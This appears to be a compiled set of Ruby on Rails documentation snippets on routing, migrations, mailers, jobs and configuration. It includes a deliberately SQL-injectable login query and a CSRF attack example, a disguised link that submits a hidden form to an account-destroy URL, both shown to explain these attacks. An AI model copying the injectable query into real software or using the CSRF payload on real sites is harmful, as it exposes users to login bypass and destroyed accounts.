DESCRIPTION: Default HTML layout template for Action Mailer located in app/views/layouts/mailer.html.erb. It provides the basic structure for HTML emails with a yield call to render the email-specific content.

LANGUAGE: html
CODE:
# app/views/layouts/mailer.html.erb
<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <style>
      /* Email styles need to be inline */
    </style>
  </head>

  <body>
    <%= yield %>
  </body>
</html>

----------------------------------------

TITLE: Adding Parameter Wrapping Configuration
DESCRIPTION: Creates a new initializer for parameter wrapping settings, enabling JSON parameter wrapping and disabling root elements in JSON. This is enabled by default in new Rails 3.1 applications.

LANGUAGE: ruby
CODE:
# Be sure to restart your server when you modify this file.
# This file contains settings for ActionController::ParamsWrapper which
# is enabled by default.

# Enable parameter wrapping for JSON. You can disable this by setting :format to an empty array.
ActiveSupport.on_load(:action_controller) do
  wrap_parameters format: [:json]
end

# Disable root element in JSON by default.
ActiveSupport.on_load(:active_record) do
  self.include_root_in_json = false
end

----------------------------------------

TITLE: Setting Default Values for Locals in ERB Templates
DESCRIPTION: Example showing how to set default values for locals in ERB templates using magic comments. This allows templates to have fallback values when specific locals aren't provided at render time.

LANGUAGE: erb
CODE:
<%# locals: (message: "Hello, world!") -%>
<%= message %>

----------------------------------------

TITLE: Refactoring Reference Class to Use ClassCache in Ruby
DESCRIPTION: Modified the ActiveSupport::Dependencies::Reference class to utilize the new ClassCache class directly, enhancing efficiency and structure.

LANGUAGE: ruby
CODE:
ActiveSupport::Dependencies::Reference

----------------------------------------

TITLE: Using Rails Link Helpers in Templates
DESCRIPTION: Refactors the products index view to use Rails' link_to helper and path helpers, which provide a more robust way to generate links to resource actions.

LANGUAGE: erb
CODE:
<h1>Products</h1>

<div id="products">
  <% @products.each do |product| %>
    <div>
      <%= link_to product.name, product_path(product.id) %>
    </div>
  <% end %>
</div>

----------------------------------------

TITLE: Defining Multiple Resources in One Line
DESCRIPTION: Shows how to define routes for multiple resources with a single call to resources, which is a shortcut for defining them individually.

LANGUAGE: ruby
CODE:
resources :photos, :books, :videos

----------------------------------------

TITLE: Removing Sprockets-related Gems with Bundler in Rails
DESCRIPTION: Command to remove Sprockets-related gems (sprockets, sprockets-rails, sass-rails) when migrating to Propshaft in a Rails application.

LANGUAGE: bash
CODE:
bundle remove sprockets
bundle remove sprockets-rails
bundle remove sass-rails

----------------------------------------

TITLE: Implementing an Active Job with GlobalID Support in Ruby
DESCRIPTION: Demonstrates how to create a job using the Active Job framework that accepts Active Record objects as arguments. Global ID handles serialization automatically so Active Record objects can be passed directly as job arguments.

LANGUAGE: ruby
CODE:
class TrashableCleanupJob < ActiveJob::Base
  def perform(trashable, depth)
    trashable.cleanup(depth)
  end
end

----------------------------------------

TITLE: Running Commands in Specific Directories with inside Method
DESCRIPTION: Example of running a command within a specific directory using the inside method, demonstrating how to create a symlink to a Rails installation.

LANGUAGE: ruby
CODE:
inside("vendor") do
  run "ln -s ~/commit-rails/rails rails"
end

----------------------------------------

TITLE: Using SecureRandom.base58 for random string generation
DESCRIPTION: Generates a random base58 string, which is useful for creating readable identifiers without easily confused characters.

LANGUAGE: ruby
CODE:
SecureRandom.base58

----------------------------------------

TITLE: Using debug View Helper in Rails ERB Templates
DESCRIPTION: Demonstrates how to use the debug helper in a Rails view to inspect an object by rendering it in YAML format within a pre tag for better readability.

LANGUAGE: erb
CODE:
<%= debug @article %>
<p>
  <b>Title:</b>
  <%= @article.title %>
</p>

----------------------------------------

TITLE: Running System Tests with Remote Selenium Server
DESCRIPTION: This command runs system tests using a remote Selenium server by setting the SELENIUM_REMOTE_URL environment variable to point to the WebDriver hub URL.

LANGUAGE: bash
CODE:
$ SELENIUM_REMOTE_URL=http://localhost:4444/wd/hub bin/rails test:system

----------------------------------------

TITLE: JavaScript with Digested Asset Path
DESCRIPTION: Shows the transformed JavaScript after Propshaft processes the RAILS_ASSET_URL macro. The URL is replaced with the digested version for proper caching in production.

LANGUAGE: javascript
CODE:
export default class extends Controller {
  init() {
    this.img = "/assets/icons/trash-54g9cbef.svg";
  }
}

----------------------------------------

TITLE: Checking Named Generator Help
DESCRIPTION: Command to check the help information for the named generator, showing it now requires a NAME parameter.

LANGUAGE: bash
CODE:
$ bin/rails generate initializer --help
Usage:
  bin/rails generate initializer NAME [options]

----------------------------------------

TITLE: Defining a Job Class with Queue Specification in Rails
DESCRIPTION: Defines an ActiveJob class with a specific queue priority. When used with queue_name_prefix, the actual queue name will include the prefix.

LANGUAGE: ruby
CODE:
class GuestsCleanupJob < ActiveJob::Base
  queue_as :high_priority
  #....
end

----------------------------------------

TITLE: Running a Single Test by Name in Rails
DESCRIPTION: Demonstrates how to run a specific test by its name using the -n flag. This is useful when you want to isolate and run just one test method.

LANGUAGE: bash
CODE:
$ cd actionmailer
$ bin/test test/mail_layout_test.rb -n test_explicit_class_layout

----------------------------------------

TITLE: Customizing Inflection Acronyms in Rails
DESCRIPTION: Configures ActiveSupport::Inflector to properly handle acronyms like HTML and SSL when creating class names from file names. This affects how Rails inflects globally throughout the application.

LANGUAGE: ruby
CODE:
ActiveSupport::Inflector.inflections(:en) do |inflect|
  inflect.acronym "HTML"
  inflect.acronym "SSL"
end

----------------------------------------

TITLE: Basic Book Model Instance Output in Rails Console
DESCRIPTION: Shows the Ruby console output of a new Book model instance that hasn't been saved yet, displaying nil values for its attributes.

LANGUAGE: ruby
CODE:
# => #<Book id: nil, title: nil, author: nil>

----------------------------------------

TITLE: Converting Rails Relation to Array Before Using Mutator Methods
DESCRIPTION: Example showing how to convert an ActiveRecord::Relation to an array before using mutator methods like compact! which are no longer available directly on Relations.

LANGUAGE: ruby
CODE:
# Instead of this
Author.where(name: "Hank Moody").compact!

# Now you have to do this
authors = Author.where(name: "Hank Moody").to_a
authors.compact!

----------------------------------------

TITLE: Configuring Trilogy Database Adapter in YAML
DESCRIPTION: Example of configuring the new Trilogy MySQL-compatible database adapter in a Rails application using database.yml.

LANGUAGE: yaml
CODE:
development:
  adapter: trilogy
  database: blog_development
  pool: 5

----------------------------------------

TITLE: Adding Unsubscribe URL to Text Email Template
DESCRIPTION: Updates the product_mailer/in_stock text email template to include an unsubscribe URL with a unique token. This provides a plain text alternative for unsubscribing.

LANGUAGE: erb
CODE:
Good news!

<%= @product.name %> is back in stock.
<%= product_url(@product) %>

Unsubscribe: <%= unsubscribe_url(token: params[:subscriber].generate_token_for(:unsubscribe)) %>

----------------------------------------

TITLE: Configuring Custom Cache Store with Size Parameter
DESCRIPTION: Example of configuring a custom cache store with additional parameters like size. This shows how to set up the memory store with a specific memory allocation.

LANGUAGE: ruby
CODE:
config.cache_store = :memory_store, { size: 64.megabytes }

----------------------------------------

TITLE: Configuring ActionView sanitized tags after initialization in Ruby
DESCRIPTION: This snippet demonstrates how to use the config.after_initialize block to modify ActionView's sanitized allowed tags by removing the 'div' tag. The after_initialize method runs after Rails has completed application initialization.

LANGUAGE: ruby
CODE:
config.after_initialize do
  ActionView::Base.sanitized_allowed_tags.delete "div"
end

----------------------------------------

TITLE: Responding to format variants in Rails controllers
DESCRIPTION: Example of responding to different format variants (tablet, phone) in a controller action. This allows for device-specific template rendering and business logic.

LANGUAGE: ruby
CODE:
respond_to do |format|
  format.html do |html|
    html.tablet # renders app/views/projects/show.html+tablet.erb
    html.phone { extra_setup; render ... }
  end
end

----------------------------------------

TITLE: Configuring Trilogy Database Adapter with Environment Variable
DESCRIPTION: Example of configuring the Trilogy database adapter using the DATABASE_URL environment variable instead of the database.yml file.

LANGUAGE: ruby
CODE:
ENV["DATABASE_URL"] # => "trilogy://localhost/blog_development?pool=5"

----------------------------------------

TITLE: Creating Custom Validators in Rails 3 with ActiveModel::EachValidator
DESCRIPTION: This snippet demonstrates how to create a custom validator class in Rails 3 by extending ActiveModel::EachValidator. It implements a TitleValidator that checks if a value is included in a predefined list of valid titles.

LANGUAGE: ruby
CODE:
class TitleValidator < ActiveModel::EachValidator
  Titles = ['Mr.', 'Mrs.', 'Dr.']
  def validate_each(record, attribute, value)
    unless Titles.include?(value)
      record.errors[attribute] << 'must be a valid title'
    end
  end
end

----------------------------------------

TITLE: Introduction of ClassCache for Dependency Management in Ruby
DESCRIPTION: Added a new ClassCache class to ActiveSupport::Dependencies for holding references to reloadable classes, improving the class management system.

LANGUAGE: ruby
CODE:
ActiveSupport::Dependencies::ClassCache

----------------------------------------

TITLE: Defining Explicit Namespaces with Class Keyword in Ruby
DESCRIPTION: Demonstrates the proper way to define namespaces using the class keyword to ensure child objects like Hotel::Pricing are correctly found by the autoloader. Alternative approaches like Class.new won't work with explicit namespaces.

LANGUAGE: ruby
CODE:
class Hotel
end

----------------------------------------

TITLE: Implementing Parameterized Mailers in Ruby on Rails 5.1
DESCRIPTION: Demonstrates the new parameterized mailers feature in Rails 5.1 which allows sharing common parameters across all methods in a mailer class. This example shows how to set up instance variables using before_action with parameters passed to the mailer.

LANGUAGE: ruby
CODE:
class InvitationsMailer < ApplicationMailer
  before_action { @inviter, @invitee = params[:inviter], params[:invitee] }
  before_action { @account = params[:inviter].account }

  def account_invitation
    mail subject: "#{@inviter.name} invited you to their Basecamp (#{@account.name})"
  end
end

LANGUAGE: ruby
CODE:
InvitationsMailer.with(inviter: person_a, invitee: person_b)
                 .account_invitation.deliver_later

----------------------------------------

TITLE: Updating Gemfile for Rails 3.2
DESCRIPTION: Necessary changes to the Gemfile when upgrading to Rails 3.2, including updating the Rails version and adding the asset pipeline gem group.

LANGUAGE: ruby
CODE:
gem "rails", "3.2.21"

group :assets do
  gem "sass-rails",   "~> 3.2.6"
  gem "coffee-rails", "~> 3.2.2"
  gem "uglifier",     ">= 1.0.3"
end

----------------------------------------

TITLE: Unicode Character Routes in Rails
DESCRIPTION: Demonstrates how to define routes with Unicode characters in the path. Rails fully supports non-ASCII characters in route definitions.

LANGUAGE: ruby
CODE:
get "ããã«ã¡ã¯", to: "welcome#index"

----------------------------------------

TITLE: Using Array position-from-end methods
DESCRIPTION: New utility methods for accessing elements near the end of an array without calculating indices manually.

LANGUAGE: ruby
CODE:
Array#second_to_last
Array#third_to_last

----------------------------------------

TITLE: Using Lambda Functions with Collection Select Helpers
DESCRIPTION: This Ruby code demonstrates how to use anonymous lambda functions with options_from_collection_for_select to dynamically determine which options should be disabled based on runtime conditions.

LANGUAGE: ruby
CODE:
options_from_collection_for_select(@product.sizes, :name, :id, :disabled => lambda{|size| size.out_of_stock?})

----------------------------------------

TITLE: Testing Combined Callbacks in Rails Console
DESCRIPTION: IRB example demonstrating how the combined after_create and after_update callbacks behave differently when creating a new user versus updating an existing user. It shows the different logging messages and triggered actions.

LANGUAGE: irb
CODE:
irb> user = User.create(name: "John Doe", email: "john.doe@example.com")
Confirmation email sent to: john.doe@example.com
=> #<User id: 1, email: "john.doe@example.com", ...>

irb> user.update(email: "john.doe.new@example.com")
Notification sent to admin about critical info update for: john.doe.new@example.com
=> true

----------------------------------------

TITLE: Generating a Migration to Add Author Reference to Books in Ruby on Rails
DESCRIPTION: Command to generate a migration for adding an author reference to the books table. This sets up the foreign key relationship in the database to support the association in the models.

LANGUAGE: bash
CODE:
rails generate migration AddAuthorToBooks author:references

----------------------------------------

TITLE: Adding Description to a Generator
DESCRIPTION: Enhanced generator with a description using the desc method to provide better help information when viewing generator help.

LANGUAGE: ruby
CODE:
class InitializerGenerator < Rails::Generators::Base
  desc "This generator creates an initializer file at config/initializers"
  def create_initializer_file
    create_file "config/initializers/initializer.rb", <<~RUBY
      # Add initialization content here
    RUBY
  end
end

----------------------------------------

TITLE: Getting Detailed Generator Help
DESCRIPTION: Command to display detailed help information for a specific generator (scaffold) using the --help option.

LANGUAGE: bash
CODE:
$ bin/rails generate scaffold --help

----------------------------------------

TITLE: Vulnerable Authentication Query with String Interpolation
DESCRIPTION: Demonstrates an insecure authentication implementation vulnerable to SQL injection that could allow attackers to bypass login requirements.

LANGUAGE: ruby
CODE:
User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")

----------------------------------------

TITLE: Customizing Inflection for Individual Files with Autoloader Inflector
DESCRIPTION: Configures each autoloader's inflector to handle specific file name to constant name mappings, while still using ActiveSupport's String#camelize as fallback for other inflections.

LANGUAGE: ruby
CODE:
Rails.autoloaders.each do |autoloader|
  autoloader.inflector.inflect(
    "html_parser" => "HTMLParser",
    "ssl_error"   => "SSLError"
  )
end

----------------------------------------

TITLE: Avoiding Second Person Pronouns in Documentation
DESCRIPTION: Demonstrates how to rephrase documentation to avoid using 'you' and 'your', making it more professional and objective.

LANGUAGE: ruby
CODE:
# BAD
# If you need to use +return+ statements in your callbacks, it is
# recommended that you explicitly define them as methods.

# GOOD
# If +return+ is needed, it is recommended to explicitly define a
# method.

----------------------------------------

TITLE: Including Deprecated HTML Sanitizer in Rails Application
DESCRIPTION: Gemfile entry for including the deprecated HTML sanitizer implementation when upgrading to Rails 4.2. This allows applications to continue using the old sanitizer functionality instead of the new Loofah-based implementation.

LANGUAGE: ruby
CODE:
gem "rails-deprecated_sanitizer"

----------------------------------------

TITLE: Removing Uniqueness in ActiveRecord Relations
DESCRIPTION: Demonstrates how to revert uniqueness in a relation by passing false to the uniq method, allowing flexible query building.

LANGUAGE: ruby
CODE:
Client.select(:name).uniq.uniq(false)

----------------------------------------

TITLE: Testing AJAX Requests
DESCRIPTION: Demonstrates how to test AJAX requests by setting the xhr option to true and checking the response.

LANGUAGE: ruby
CODE:
test "AJAX request" do
  article = articles(:one)
  get article_url(article), xhr: true

  assert_equal "hello world", @response.body
  assert_equal "text/javascript", @response.media_type
end

----------------------------------------

TITLE: Creating Highlighted Paragraphs in Rails Guides
DESCRIPTION: Shows how to create special highlighted paragraphs (notes, tips, warnings) by prefixing a paragraph with NOTE:, TIP:, or WARNING: to draw attention to important information.

LANGUAGE: markdown
CODE:
NOTE: Use `NOTE`, `TIP` or `WARNING` to highlight a paragraph.

----------------------------------------

TITLE: SQL Equivalent for First Record with Composite Primary Key Ordering
DESCRIPTION: Shows the SQL query that corresponds to the Ruby code for retrieving the first product with composite primary key ordering.

LANGUAGE: sql
CODE:
SELECT * FROM products ORDER BY products.store_id ASC, products.sku ASC LIMIT 1

----------------------------------------

TITLE: Configuring Development Environment for Asset Pipeline
DESCRIPTION: Updates development environment configuration by removing RJS debug setting and adding asset pipeline settings for development mode. Disables asset compression and enables debug mode for easier troubleshooting.

LANGUAGE: ruby
CODE:
# Do not compress assets
config.assets.compress = false

# Expands the lines which load the assets
config.assets.debug = true

----------------------------------------

TITLE: Using file_fixture in Rails 5.0 tests
DESCRIPTION: A new method to access sample files in test cases, simplifying file loading for tests that need to operate on fixture files.

LANGUAGE: ruby
CODE:
file_fixture

----------------------------------------

TITLE: Rails 3.0 Routes Definition Format
DESCRIPTION: Comparison between Rails 2.x and Rails 3.0 routing definitions. In Rails 3.0, routes are namespaced within the application module rather than using ActionController::Routing::Routes.

LANGUAGE: ruby
CODE:
# Instead of:

ActionController::Routing::Routes.draw do |map|
  map.resources :posts
end

# You do:

AppName::Application.routes do
  resources :posts
end

----------------------------------------

TITLE: Incorrect Approach to Configuring Reloadable Classes in Initializers
DESCRIPTION: This code demonstrates the wrong way to configure a reloadable class in an initializer. This will raise a NameError because initializers cannot access reloadable constants.

LANGUAGE: ruby
CODE:
# config/initializers/api_gateway_setup.rb
ApiGateway.endpoint = "https://example.com" # NameError

----------------------------------------

TITLE: Adding Collection Routes with :on Option in Rails
DESCRIPTION: Defines a collection route using the :on option as a shorthand alternative to the block syntax. This creates the same functionality with a more concise syntax.

LANGUAGE: ruby
CODE:
resources :photos do
  get "search", on: :collection
end

----------------------------------------

TITLE: Configuring Cookie Serializer in Rails
DESCRIPTION: A new configuration option for specifying a serializer for the signed and encrypted cookie jars in Rails 4.1.

LANGUAGE: ruby
CODE:
config.action_dispatch.cookies_serializer

----------------------------------------

TITLE: Using Transaction Commit Callbacks with Transaction Block
DESCRIPTION: Example of registering an after_commit callback on a transaction object yielded by the transaction block. This allows for scheduling work after the transaction is committed.

LANGUAGE: ruby
CODE:
Article.transaction do |transaction|
  article.update(published: true)

  transaction.after_commit do
    PublishNotificationMailer.with(article: article).deliver_later
  end
end

----------------------------------------

TITLE: Implementing a Basic Callback with Lambda in Ruby on Rails
DESCRIPTION: Creates a simple after_create callback using a lambda function that logs a message when a new BirthdayCake record is created. This demonstrates the basic concept of callbacks triggering specific behavior during an object's lifecycle.

LANGUAGE: ruby
CODE:
class BirthdayCake < ApplicationRecord
  after_create -> { Rails.logger.info("Congratulations, the callback has run!") }
end

LANGUAGE: irb
CODE:
irb> BirthdayCake.create
Congratulations, the callback has run!

----------------------------------------

TITLE: Using ActiveRecord::Base.current_transaction in Tests
DESCRIPTION: Demonstrates that the current_transaction method works as expected within test transactions, showing the application-level semantics are preserved.

LANGUAGE: ruby
CODE:
class MyTest < ActiveSupport::TestCase
  test "Active Record current_transaction method works as expected" do
    # The implicit transaction around tests does not interfere with the
    # application-level semantics of the current_transaction.
    assert User.current_transaction.blank?
  end
end

----------------------------------------

TITLE: Defining Namespaced Routes in Rails 3.0 Using Scope
DESCRIPTION: Example of using scope method in Rails 3.0 router to namespace routes for different languages. This creates a '/es/proyecto/1/cambiar' path for the edit action with Spanish localization.

LANGUAGE: ruby
CODE:
scope 'es' do
  resources :projects, :path_names => { :edit => 'cambiar' }, :path => 'proyecto'
end

# Gives you the edit action with /es/proyecto/1/cambiar

----------------------------------------

TITLE: Using Rails.error.handle with a Fallback Value
DESCRIPTION: Example of providing a fallback value when using Rails.error.handle. If an error occurs, the fallback lambda is executed instead of returning nil.

LANGUAGE: ruby
CODE:
user = Rails.error.handle(fallback: -> { User.anonymous }) do
  User.find(params[:id])
end

----------------------------------------

TITLE: Creating Rack::Server Instance in Rails Server Command
DESCRIPTION: Shows how the Rails server command initializes a Rack::Server object and starts the web server. The code demonstrates the server initialization process in the bin/rails server command.

LANGUAGE: ruby
CODE:
Rails::Server.new.tap do |server|
  require APP_PATH
  Dir.chdir(Rails.application.root)
  server.start
end

----------------------------------------

TITLE: Removing Patterns from Strings in Rails
DESCRIPTION: Shorthand method for removing patterns from strings, equivalent to String#gsub(pattern,'').

LANGUAGE: ruby
CODE:
String#remove(pattern)

----------------------------------------

TITLE: HTML Form with CSRF Token
DESCRIPTION: This HTML snippet shows how Rails includes the authenticity_token as a hidden field in generated forms. The token is a unique value that helps prevent CSRF attacks by ensuring requests come from legitimate sources.

LANGUAGE: html
CODE:
<form accept-charset="UTF-8" action="/users/1" method="post">
<input type="hidden"
       value="67250ab105eb5ad10851c00a5621854a23af5489"
       name="authenticity_token"/>
<!-- fields -->
</form>

----------------------------------------

TITLE: Malicious CSRF Attack Using Hidden Form in an HTML Link
DESCRIPTION: Example of a CSRF attack that creates and submits a hidden form when a link is clicked. This demonstrates how attackers can execute unauthorized actions on behalf of authenticated users by disguising destructive POST requests.

LANGUAGE: html
CODE:
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>

----------------------------------------

TITLE: Requiring Dependencies in Engine Initialization
DESCRIPTION: Shows how to require dependencies before an engine's initialization to ensure they are immediately available when the engine is required.

LANGUAGE: ruby
CODE:
require "other_engine/engine"
require "yet_another_engine/engine"

module MyEngine
  class Engine < ::Rails::Engine
  end
end

----------------------------------------

TITLE: Adding Midday Time Methods to Date/Time Classes
DESCRIPTION: Methods for getting the middle of the day (noon) from Date, DateTime, and Time objects.

LANGUAGE: ruby
CODE:
Date#middle_of_day

LANGUAGE: ruby
CODE:
DateTime#middle_of_day

LANGUAGE: ruby
CODE:
Time#middle_of_day

----------------------------------------

TITLE: Implementing LocalCache as a Middleware Class in Ruby
DESCRIPTION: Refactored the LocalCache strategy to be a proper middleware class instead of an anonymous class, providing better structure and reusability.

LANGUAGE: ruby
CODE:
LocalCache

----------------------------------------

TITLE: Accessing Nested Configuration in Rails 5.1 with Symbols
DESCRIPTION: Examples showing the change in Rails 5.1 where all keys in application.secrets are loaded as symbols. Code needs to be updated from string access to symbol access.

LANGUAGE: ruby
CODE:
Rails.application.secrets[:smtp_settings]["address"]

LANGUAGE: ruby
CODE:
Rails.application.secrets[:smtp_settings][:address]

----------------------------------------

TITLE: Using content_tag_for with Individual Records
DESCRIPTION: Example of using content_tag_for with individual records in a traditional loop. This approach requires iterating over each item in the collection manually.

LANGUAGE: ruby
CODE:
@items.each do |item|
  content_tag_for(:li, item) do
    Title: <%= item.title %>
  end
end

----------------------------------------

TITLE: Running the Rails Update Task in Bash
DESCRIPTION: Example of running the 'app:update' command to help with the Rails upgrade process. This interactive command helps with creating new files and updating existing ones for compatibility with the new Rails version.

LANGUAGE: bash
CODE:
$ bin/rails app:update
       exist  config
    conflict  config/application.rb
Overwrite /myapp/config/application.rb? (enter "h" for help) [Ynaqdh]
       force  config/application.rb
      create  config/initializers/new_framework_defaults_8_0.rb
...

----------------------------------------

TITLE: Setting Controller-Specific Browser Restrictions in Rails
DESCRIPTION: This Ruby snippet shows how to implement browser restrictions for specific controller actions using the allow_browser method with the only option. This allows for more granular control over which parts of an application require specific browser versions.

LANGUAGE: ruby
CODE:
class MessagesController < ApplicationController
  # In addition to the browsers blocked by ApplicationController, also block Opera below 104 and Chrome below 119 for the show action.
  allow_browser versions: { opera: 104, chrome: 119 }, only: :show
end

----------------------------------------

TITLE: Solid Queue Configuration in Production Environment
DESCRIPTION: Configuration for Solid Queue in a production environment, setting it as the Active Job adapter and specifying database connection details.

LANGUAGE: ruby
CODE:
# config/environments/production.rb
# Replace the default in-process and non-durable queuing backend for Active Job.
config.active_job.queue_adapter = :solid_queue
config.solid_queue.connects_to = { database: { writing: :queue } }

----------------------------------------

TITLE: Using ActiveSupport.on_load Hook with ActiveRecord
DESCRIPTION: This example shows the recommended approach to include a module in ActiveRecord::Base using ActiveSupport.on_load hooks. This defers the loading of code until the framework is actually needed, improving application boot time.

LANGUAGE: ruby
CODE:
ActiveSupport.on_load(:active_record) do
  include MyActiveRecordHelper
end

----------------------------------------

TITLE: Using procs for dynamic SQL conditions in associations
DESCRIPTION: Shows how to use procs for dynamic SQL conditions in associations instead of string interpolation, which is no longer supported in Rails 3.1.

LANGUAGE: ruby
CODE:
has_many :things, :conditions => 'foo = #{bar}'          # before
has_many :things, :conditions => proc { "foo = #{bar}" } # after

----------------------------------------

TITLE: HTML Output from Select Helper with Disabled Option
DESCRIPTION: This HTML code shows the output generated by the select helper with the :disabled option, demonstrating how the disabled attribute is applied to the specified option tag.

LANGUAGE: html
CODE:
<select name="post[category]">
<option>story</option>
<option>joke</option>
<option>poem</option>
<option disabled="disabled">private</option>
</select>

----------------------------------------

TITLE: Defining Associations with Composite Primary Keys in Rails Models
DESCRIPTION: Demonstrates how to define associations between models where one model has a composite primary key containing an id column.

LANGUAGE: ruby
CODE:
class Order < ApplicationRecord
  self.primary_key = [:shop_id, :id]
  has_many :books
end

class Book < ApplicationRecord
  belongs_to :order
end

----------------------------------------

TITLE: Using Modern Rails Validation Syntax
DESCRIPTION: Example of the recommended concise validation syntax in modern Rails applications. This syntax is preferred for its readability over the older helper methods.

LANGUAGE: ruby
CODE:
validates :name, presence: true

----------------------------------------

TITLE: Using parameterized conditions with procs in associations
DESCRIPTION: Demonstrates how to use parameterized conditions inside procs for associations, which allows for safer SQL generation.

LANGUAGE: ruby
CODE:
has_many :things, :conditions => proc { ["foo = ?", bar] }

----------------------------------------

TITLE: Equivalent Explicit Routing Without Concerns in Rails
DESCRIPTION: Shows the equivalent explicit routing that would be needed without using concerns. This demonstrates how concerns help reduce duplication in route definitions.

LANGUAGE: ruby
CODE:
resources :messages do
  resources :comments
end

resources :articles do
  resources :comments
  resources :images, only: :index
end

----------------------------------------

TITLE: Generating a Multi-Column Addition Migration in Rails
DESCRIPTION: This command generates a migration to add multiple columns (part_number and price) to the products table in a single migration.

LANGUAGE: bash
CODE:
$ bin/rails generate migration AddDetailsToProducts part_number:string price:decimal

----------------------------------------

TITLE: Reporting Unexpected Errors with Rails.error.unexpected
DESCRIPTION: Using Rails.error.unexpected to report bugs or unexpected states. In production it reports and continues execution, while in development it surfaces the error for debugging.

LANGUAGE: ruby
CODE:
def edit
  if published?
    Rails.error.unexpected("[BUG] Attempting to edit a published article, that shouldn't be possible")
    false
  end
  # ...
end

----------------------------------------

TITLE: Using instance_variable_names Method
DESCRIPTION: Shows the instance_variable_names method which returns an array of instance variable names including the @ sign.

LANGUAGE: ruby
CODE:
class C
  def initialize(x, y)
    @x, @y = x, y
  end
end

C.new(0, 1).instance_variable_names # => ["@x", "@y"]

----------------------------------------

TITLE: Defining Initialization Event Hook through Rails.application.config
DESCRIPTION: This snippet shows an alternative approach to define an initialization event hook using the Rails.application.config method. This method provides the same functionality as the class-based approach but can be used outside the application class definition.

LANGUAGE: ruby
CODE:
Rails.application.config.before_initialize do
  # initialization code goes here
end

----------------------------------------

TITLE: Error Handling with Traditional Try-Catch Pattern in Ruby
DESCRIPTION: The traditional boilerplate approach to error handling in Ruby before using Rails' error reporter. This demonstrates catching a specific exception and reporting it to a service.

LANGUAGE: ruby
CODE:
begin
  do_something
rescue SomethingIsBroken => error
  MyErrorReportingService.notify(error)
end

----------------------------------------

TITLE: Using the I18n Translate and Localize Methods in Ruby
DESCRIPTION: Demonstrates the basic usage of the I18n translate and localize methods along with their shorter aliases t and l for accessing translations and formatting dates/times.

LANGUAGE: ruby
CODE:
translate # Lookup text translations
localize  # Localize Date and Time objects to local formats

----------------------------------------

TITLE: Basic PostgreSQL Database Configuration in YAML
DESCRIPTION: Configures a PostgreSQL database connection for the development environment. Sets the database name to 'blog_development' and configures a connection pool size of 5.

LANGUAGE: yaml
CODE:
development:
  adapter: postgresql
  database: blog_development
  pool: 5

----------------------------------------

TITLE: Extended config.autoload_lib Configuration with Multiple Ignored Directories in Ruby
DESCRIPTION: Configuration to autoload the lib directory while ignoring multiple subdirectories that should not be autoloaded or eager loaded. Useful for directories that don't contain standard Ruby classes.

LANGUAGE: ruby
CODE:
config.autoload_lib(ignore: %w(assets tasks templates generators middleware))

----------------------------------------

TITLE: Configuring Railties Order in Rails 3.2
DESCRIPTION: Example of how to change the loading order of railties in a Rails 3.2 application, allowing custom ordering of engines and components.

LANGUAGE: ruby
CODE:
config.railties_order = [Blog::Engine, :main_app, :all]

----------------------------------------

TITLE: Moving Custom Inflections for Compatibility with the once Autoloader
DESCRIPTION: Shows how to move custom inflections from config/initializers/inflections.rb to the application class definition for compatibility with the once autoloader.

LANGUAGE: ruby
CODE:
module MyApp
  class Application < Rails::Application
    # ...

    ActiveSupport::Inflector.inflections(:en) do |inflect|
      inflect.acronym "HTML"
    end
  end
end

----------------------------------------

TITLE: Customizing Job Transaction Enqueuing Behavior
DESCRIPTION: Example of disabling the automatic deferral of job enqueuing until after transaction commit on a per-job basis by setting the enqueue_after_transaction_commit option.

LANGUAGE: ruby
CODE:
class NewTopicNotificationJob < ApplicationJob
  self.enqueue_after_transaction_commit = :never
end

----------------------------------------

TITLE: Using Routing Concerns with Resources in Rails
DESCRIPTION: Demonstrates how to apply defined routing concerns to resources. Multiple concerns can be applied to a single resource to include all their routes.

LANGUAGE: ruby
CODE:
resources :messages, concerns: :commentable

resources :articles, concerns: [:commentable, :image_attachable]

----------------------------------------

TITLE: Configuring Development Environment for Asset Pipeline
DESCRIPTION: Required settings for the development environment in Rails 3.1 to support the asset pipeline, including disabling compression and enabling debug mode for assets.

LANGUAGE: ruby
CODE:
# Do not compress assets
config.assets.compress = false

# Expands the lines which load the assets
config.assets.debug = true

----------------------------------------

TITLE: Using find_each to Process Individual Records in Batches in Ruby on Rails
DESCRIPTION: This snippet shows the find_each method, which provides a wrapper around find_in_batches to process individual records while retrieving them in batches for better memory efficiency.

LANGUAGE: ruby
CODE:
Customer.find_each do |customer|
  customer.update_account_balance!
end

----------------------------------------

TITLE: Finding Multiple Records with Composite Primary Keys
DESCRIPTION: Shows how to retrieve multiple records by passing an array of composite primary key arrays to Product.find.

LANGUAGE: ruby
CODE:
# Find the products with primary keys [1, "ABC98765"] and [7, "ZZZ11111"]
irb> products = Product.find([[1, "ABC98765"], [7, "ZZZ11111"]])
=> [
  #<Product store_id: 1, sku: "ABC98765", description: "Red Hat">,
  #<Product store_id: 7, sku: "ZZZ11111", description: "Green Pants">
]

----------------------------------------

TITLE: Example of Bad vs Good Comment Wording in Ruby Documentation
DESCRIPTION: Demonstrates how to write clear, concise documentation by using simple declarative sentences and getting to the point quickly.

LANGUAGE: ruby
CODE:
# BAD
# Caching may interfere with being able to see the results
# of code changes.

# GOOD
# Caching interferes with seeing the results of code changes.

----------------------------------------

TITLE: Enabling Zeitwerk Autoloading Mode in Rails 6
DESCRIPTION: Configuration examples for enabling Zeitwerk autoloading mode, which is the default in Rails 6 when using load_defaults 6.0, but can be explicitly set in applications using previous defaults.

LANGUAGE: ruby
CODE:
# config/application.rb

config.load_defaults 6.0

LANGUAGE: ruby
CODE:
# config/application.rb

config.autoloader = :zeitwerk

----------------------------------------

TITLE: Generated Remove Column Migration in Ruby on Rails
DESCRIPTION: This migration removes the part_number column from the products table. It demonstrates how Rails handles the RemoveXXXFromYYY naming pattern in the generator.

LANGUAGE: ruby
CODE:
class RemovePartNumberFromProducts < ActiveRecord::Migration[8.1]
  def change
    remove_column :products, :part_number, :string
  end
end

----------------------------------------

TITLE: Sample Migration Output in Rails
DESCRIPTION: Example output of a successful database migration execution, showing the migration name, actions performed, and execution time.

LANGUAGE: bash
CODE:
== 20240426151900 CreateProducts: migrating ===================================
-- create_table(:products)
   -> 0.0030s
== 20240426151900 CreateProducts: migrated (0.0031s) ==========================

